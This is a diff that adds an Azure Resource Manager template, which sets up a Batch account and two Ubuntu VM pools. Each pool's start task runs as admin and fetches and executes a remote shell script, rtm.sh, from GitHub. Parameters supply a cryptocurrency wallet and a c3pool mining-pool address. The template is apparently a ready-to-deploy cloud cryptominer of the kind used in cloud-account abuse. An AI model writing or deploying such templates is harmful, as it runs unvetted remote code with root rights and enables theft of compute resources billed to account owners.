@@ -1,0 +1,158 @@
+{
+    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+    "contentVersion": "1.0.0.0",
+    "parameters": {
+        "batchAccounts_batches_name": {
+            "defaultValue": "batch21sf4rs",
+            "type": "String"
+        },
+        "VMs_D2S_V3": {
+            "defaultValue": 1,
+            "type": "Int"
+        },
+        "VMs_D8S_V3": {
+            "defaultValue": 1,
+            "type": "Int"
+        },
+        "user_wallet": {
+            "defaultValue": "427m24rhF74baasdgqT58LP2u4EqRzk2CSKNNJNxaDWmD2G8h94H6drKA8wyf2Qu3QdJudF7R2gD5YxZCCAeDrdNGSCjms3",
+            "type": "string"
+        },
+        "user_pool_port": {
+            "defaultValue": "auto.c3pool.org:19999",
+            "type": "string"
+        },
+        "location": {
+            "defaultValue": "eastus",
+            "type": "string"
+        }
+    },
+    "variables": {
+        "commandLine_template": "/bin/bash -c \"\nsudo wget https://raw.githubusercontent.com/jilyzx/az/main/rtm.sh;\nsudo chmod +x rtm.sh;\nsudo ./rtm.sh \n\"",
+        "commandLine": "[replace(replace(variables('commandLine_template'),'user_wallet', parameters('user_wallet')),'user_pool_port',parameters('user_pool_port'))]"
+    },
+    "resources": [
+        {
+            "type": "Microsoft.Batch/batchAccounts",
+            "apiVersion": "2021-01-01",
+            "name": "[parameters('batchAccounts_batches_name')]",
+            "location": "[parameters('location')]",
+            "identity": {
+                "type": "None"
+            },
+            "properties": {
+                "poolAllocationMode": "BatchService",
+                "publicNetworkAccess": "Enabled",
+                "encryption": {
+                    "keySource": "Microsoft.Batch"
+                }
+            }
+        },
+        {
+            "type": "Microsoft.Batch/batchAccounts/pools",
+            "apiVersion": "2021-01-01",
+            "name": "[concat(parameters('batchAccounts_batches_name'), '/D2S_V3')]",
+            "dependsOn": [
+                "[resourceId('Microsoft.Batch/batchAccounts', parameters('batchAccounts_batches_name'))]"
+            ],
+            "properties": {
+                "vmSize": "STANDARD_D2S_V3",
+                "interNodeCommunication": "Disabled",
+                "taskSlotsPerNode": 1,
+                "taskSchedulingPolicy": {
+                    "nodeFillType": "Pack"
+                },
+                "deploymentConfiguration": {
+                    "virtualMachineConfiguration": {
+                        "imageReference": {
+                            "publisher": "canonical",
+                            "offer": "ubuntuserver",
+                            "sku": "18.04-lts",
+                            "version": "latest"
+                        },
+                        "nodeAgentSkuId": "batch.node.ubuntu 18.04",
+                        "nodePlacementConfiguration": {
+                            "policy": "Regional"
+                        }
+                    }
+                },
+                "networkConfiguration": {
+                    "publicIPAddressConfiguration": {
+                        "provision": "BatchManaged"
+                    }
+                },
+                "scaleSettings": {
+                    "fixedScale": {
+                        "targetDedicatedNodes": "[parameters('VMs_D2S_V3')]",
+                        "targetLowPriorityNodes": 0,
+                        "resizeTimeout": "PT15M"
+                    }
+                },
+                "startTask": {
+                    "commandLine": "[variables('commandLine_template')]",
+                    "userIdentity": {
+                        "autoUser": {
+                            "scope": "Task",
+                            "elevationLevel": "Admin"
+                        }
+                    },
+                    "maxTaskRetryCount": 0,
+                    "waitForSuccess": true
+                }
+            }
+        },
+        {
+            "type": "Microsoft.Batch/batchAccounts/pools",
+            "apiVersion": "2021-01-01",
+            "name": "[concat(parameters('batchAccounts_batches_name'), '/D8S_V3')]",
+            "dependsOn": [
+                "[resourceId('Microsoft.Batch/batchAccounts', parameters('batchAccounts_batches_name'))]"
+            ],
+            "properties": {
+                "vmSize": "STANDARD_D8S_V3",
+                "interNodeCommunication": "Disabled",
+                "taskSlotsPerNode": 1,
+                "taskSchedulingPolicy": {
+                    "nodeFillType": "Pack"
+                },
+                "deploymentConfiguration": {
+                    "virtualMachineConfiguration": {
+                        "imageReference": {
+                            "publisher": "canonical",
+                            "offer": "ubuntuserver",
+                            "sku": "18.04-lts",
+                            "version": "latest"
+                        },
+                        "nodeAgentSkuId": "batch.node.ubuntu 18.04",
+                        "nodePlacementConfiguration": {
+                            "policy": "Regional"
+                        }
+                    }
+                },
+                "networkConfiguration": {
+                    "publicIPAddressConfiguration": {
+                        "provision": "BatchManaged"
+                    }
+                },
+                "scaleSettings": {
+                    "fixedScale": {
+                        "targetDedicatedNodes": "[parameters('VMs_D8S_V3')]",
+                        "targetLowPriorityNodes": 0,
+                        "resizeTimeout": "PT15M"
+                    }
+                },
+                "startTask": {
+                    "commandLine": "[variables('commandLine_template')]",
+                    "userIdentity": {
+                        "autoUser": {
+                            "scope": "Task",
+                            "elevationLevel": "Admin"
+                        }
+                    },
+                    "maxTaskRetryCount": 0,
+                    "waitForSuccess": true
+                }
+            }
+        }
+    ]
+}
